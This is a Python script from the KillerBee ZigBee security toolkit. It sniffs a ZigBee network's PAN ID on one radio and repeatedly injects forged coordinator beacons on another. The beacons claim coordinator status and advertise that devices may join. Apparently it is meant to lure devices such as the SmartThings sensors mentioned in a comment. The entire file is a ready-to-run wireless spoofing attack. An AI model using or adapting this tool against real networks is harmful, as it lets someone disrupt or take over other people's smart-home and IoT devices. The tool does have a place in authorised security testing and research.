#!/usr/bin/env python3

# Contributed by Bryan Halfpap <Bryanhalf@gmail.com>, Copyright 2015

from __future__ import print_function

#TODO: Reduce the usage of globals
import signal
import sys
import argparse
import threading
from threading import Event
import logging
from time import sleep

from killerbee import *


def create_beacon(panid, coordinator, epanid):
    '''Raw creation of beacon packet.'''
    beacon = [
        # FRAME CONTROL
        "\x00",  # FCF for beacon 0x00
        "\x80",  # src addressing mode: short/16-bit 0x0002 (this is the only FCF flag marked)
        "\xd8",  # Sequence number for 802.15.4 layer
        str(struct.pack("H", panid)),  # 2-byte shortcode of panid
        #str(struct.pack("H", coordinator)[0]), # only some implementations make it 0000 "\x00\x00", # Source address 0
        "\x00\x00",
        # SUPERFRAME
        "\xff\xcf",  # beacon interval, superframe interval, final cap slot, jbattery extension, pan coordinator (true!), association permit (true)
        # GTS
        "\x00",
        # Pending addresses
        "\x00",
        # bullshit zigbee layer packet
        "\x00\x22\x8c",
        # Extended PAN ID (Zigbee NWK layer)
        str(struct.pack("L", epanid)),
        "\xff\xff\xff\x00"
    ]
    return ''.join(beacon)


# Thread 1: Sniffs and extracts Source PAN ID
def get_spanids():
    spanid = threading.spanid
    canidate = 0
    restart_threshold = 0
    while not continue_execution.isSet():
        try:
            recvpkt = listen.pnext()
        except:
            print("Warning: Issue recieving packet.")
            pass  # TODO: Should this be continue instead?
        # Check for empty packet (timeout) and valid FCS
        if recvpkt != None and recvpkt['validcrc']:
            restart_threshold = 0
            try:
                canidate = struct.unpack('H', recvpkt['bytes'][3:5])[0]
            except:
                print(recvpkt['bytes'][3:5])
                pass
            if canidate != None and canidate != spanid:
                # OK we got a packet, lets go back up and send out a beacon$
                print("Got beacon from {0}".format(hex(spanid)))
                spanid = canidate
                # Now start sending beacons on the gathered Source PAN ID by informing the other thread:
                threading.spanid = spanid
        # BUG: There's an instance where (at least at the time of this tool writing) we read a packet generated by
        #      the smartthings motion sensor and *crash* - we handle that here by assuming
        #      that if we didn't get a packet that the interface is busted and we should restart it.
        # TODO: Isolate the issue and file a bug.
        restart_threshold += 1
        if restart_threshold >= 15:
            print("Crash is assumed - restarting sniffer interface.", end=' ')
            listen.sniffer_off()
            listen.sniffer_on()
            restart_threshold = 0


# Thread 2: Injects beacons
def inject():
    while not continue_execution.isSet():
        sleep(args.sleep)  # Added sleep as it seems we were overwhelming USB lib.
        sp = create_beacon(threading.spanid, args.coordinator, args.epanid) 
        #TODO: Is there any need for: args.devleave, args.coordinator, args.device)
        try:
            kb.inject(sp) #create_beacon returns a string
        except:
            print("! - Injection Error, try slowing the rate of broadcast", end=' ')
            pass
    pass


if __name__ == '__main__':
    tohex = lambda s: int(s.replace(':', ''), 16)
    # Command-line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--channel', '-c', action='store', dest='channel', required=True, type=int, default=11)
    parser.add_argument('-i', '--interface', action='store', dest='devstring')
    parser.add_argument('-l', '--listen', action='store', dest='listeninterface')
    parser.add_argument('-p', '--panid', action='store', required=True, type=tohex)
    parser.add_argument('-e', '--epanid', help="Extended PAN ID", action='store', required=True, type=tohex)
    parser.add_argument('-s', '--coordinator', action='store', required=True, type=tohex)
    parser.add_argument('-w','--sleep', action='store', type=float, required=False, default=0.01)
    #parser.add_argument('--numloops', action='store', default=1, type=int)
    args = parser.parse_args()

    # Can't get the device to like context switching between listen and inject, so we have to have a workaround...
    kb = KillerBee(device=args.devstring)
    listen = KillerBee(device=args.listeninterface)

    kb.set_channel(args.channel)
    listen.set_channel(args.channel)
    listen.sniffer_on()

    coordinator = struct.pack('>H', args.coordinator)

    # I'm committing a sin by using the threading module to hold a shared state variable
    threading.spanid = args.panid

    continue_execution = Event()

    getem1 = threading.Thread(target=get_spanids)
    getem2 = threading.Thread(target=inject)

    getem1.daemon = True
    getem2.daemon = True

    getem2.start()
    getem1.start()

    #def signal_handler(signal, frame):
    #    continue_execution.set()
    #    import pdb;pdb.set_trace()

    #signal.signal(signal.SIGINT, signal_handler)

    while not continue_execution.isSet():
        try:
            getem2.join(timeout=1)
        except KeyboardInterrupt:
            continue_execution.set()
            
    # cleanup (not yet required since Killerbee() re-initializes interface for rzusbsticks) 
